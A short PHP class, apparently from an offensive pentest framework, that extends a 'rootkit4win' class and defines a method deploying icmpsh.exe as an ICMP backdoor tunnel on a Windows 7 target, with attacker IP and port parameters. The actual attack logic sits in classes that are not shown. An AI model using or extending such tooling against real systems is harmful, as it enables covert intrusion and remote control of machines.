<?php 




class tunnel4win extends rootkit4win{

  

    public function __construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot) {
        parent::__construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot);
    }
    
    
    
    
    public function tunnel_icmp2icmp(){
        $backdoor_icmp = new malware4win($this->win7x86, $this->prof, "0", "$this->dir_tmp/icmpsh.exe","");
        $backdoor_icmp->backdoor_win_icmp();
        $this->pause();
    }
    // #############################################################################
    
    
    
}
?>